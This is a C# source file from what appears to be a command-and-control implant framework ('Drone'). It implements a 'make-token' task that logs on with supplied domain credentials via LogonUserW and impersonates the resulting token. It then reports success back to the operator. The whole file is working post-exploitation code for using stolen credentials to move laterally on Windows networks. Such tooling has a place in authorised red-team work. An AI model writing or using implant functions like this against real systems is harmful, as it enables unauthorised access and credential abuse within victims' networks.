using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

using Drone.Models;
using Win32 = Drone.Utilities.Win32;

namespace Drone.Functions;

public class MakeToken : DroneFunction
{
    public override string Name => "make-token";
    
    public override void Execute(DroneTask task)
    {
        var userDomain = task.Parameters[0].Split('\\');
            
        var domain = userDomain[0];
        var username = userDomain[1];
        var password = task.Parameters[1];

        // create token
        var hToken = Win32.LogonUserW(
            username,
            domain,
            password,
            Win32.LOGON_USER_TYPE.LOGON32_LOGON_NEW_CREDENTIALS,
            Win32.LOGON_USER_PROVIDER.LOGON32_PROVIDER_DEFAULT);

        if (hToken == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error());
        
        // impersonate token
        var success = Win32.ImpersonateToken(hToken);
        
        Win32.CloseHandle(hToken);
        
        if (!success)
            throw new Win32Exception(Marshal.GetLastWin32Error());

        Drone.SendOutput(task.TaskId, $"Impersonated token for {domain}\\{username}.");
    }
}